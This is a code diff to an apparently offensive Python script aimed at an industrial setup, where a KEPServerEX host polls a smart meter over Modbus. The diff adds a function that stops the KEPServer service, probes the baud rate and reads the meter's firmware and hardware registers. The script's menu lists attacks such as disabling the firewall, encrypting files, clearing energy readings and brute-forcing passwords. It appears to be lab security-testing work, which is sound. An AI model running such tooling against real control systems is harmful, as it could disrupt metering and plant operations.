@@ -525,13 +525,14 @@ def checkBaudRate():
 
     for baudrate in baudrate_list:
         parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
-        cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
-        baudRateOutput = cp.stdout.decode('utf-8').strip().split()
+        # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
+        # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
+        baudRateOutput = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, text=True)
 
         print(f"Checking baudrate {baudrate}:")
         # print(baudRateOutput)
        
-        if "[206]:" in baudRateOutput:
+        if "[206]:" in baudRateOutput.stdout:
             print(f"Baudrate is {baudrate}\n")
             found_baudrate = baudrate
             break
@@ -554,6 +555,84 @@ def checkBaudRate():
         print("Fail.\n")
 
     return found_baudrate
+
+def getHardwareInfo():
+    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
+    if "RUNNING" in netshare.stdout:
+        print("Kepserver is running, Stopping now.")
+        service_name = "KEPServerEXV6"
+        cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
+        output = cp.stdout.decode('utf-8').strip().split()
+        if "FAILED" in cp.stdout.decode('utf-8'):
+            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
+        else:
+            print("The " + output[1] + " service is " + output[9])
+            sleep(15)
+
+    current_directory = getcwd()
+    executable_path = current_directory + "\\modpoll.exe"
+
+    baudrate = checkBaudRate()
+    if baudrate in ["4800", "9600", "19200"]:
+        parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
+        # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
+        # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
+        firmwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+
+        parameters[9] = "9006" # DPM33 Address for reading hardwareOutput
+        hardwareOutput = run([executable_path] + parameters, stdout=PIPE, check=False).stdout.decode('utf-8').strip().split()
+
+        # TODO: For "cannot be detected" stuff, raise an exception
+        if "[9005]:" in firmwareOutput:
+            firmware_index = firmwareOutput.index("[9005]:")
+            print(f"Firmware version: {firmwareOutput[firmware_index + 1]}")
+        else:
+            print(f"Firmware version cannot be detected")
+
+        if "[9006]:" in hardwareOutput:
+            hardware_index = hardwareOutput.index("[9006]:")
+            print(f"Hardware version: {hardwareOutput[hardware_index + 1]}")
+        else:
+            print(f"Hardware version cannot be detected")
+        
+        try: 
+            service_name = "KEPServerEXV6"
+            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
+            output = cp.stdout.decode('utf-8').strip().split()
+            if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]))
+                print("Fail.\n")
+            else:
+                print("The " + output[1] + " service is " + output[9])
+
+            print("\nOk.\n")
+        except CalledProcessError as e:
+            print("Error executing the executable file:", e)
+            print("Fail.\n")
+    
+    else:
+        try: 
+            service_name = "KEPServerEXV6"
+            cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
+            output = cp.stdout.decode('utf-8').strip().split()
+            if "FAILED" in cp.stdout.decode('utf-8'):
+                print("FAILED: " + " ".join(output[4:]))
+                print("Fail.\n")
+            else:
+                print("The " + output[1] + " service is " + output[9])
+
+            print("\nOk.\n")
+        except CalledProcessError as e:
+            print("Error executing the executable file:", e)
+            print("Fail.\n")
+
+        raise Exception("Unable to connect to the SmartMeter")
+
+   
+    return
+        
+
+
 
 def revert(revertoption):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
@@ -1025,8 +1104,8 @@ if __name__ == '__main__':
         bruteForceKEP()
     elif attackoption == "13":
         changeBaudRate()
-    elif attackoption == "14": # Test checkbaudrate
-        checkBaudRate()
+    elif attackoption == "14":
+        getHardwareInfo()
     elif attackoption == "-h":
         print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
 
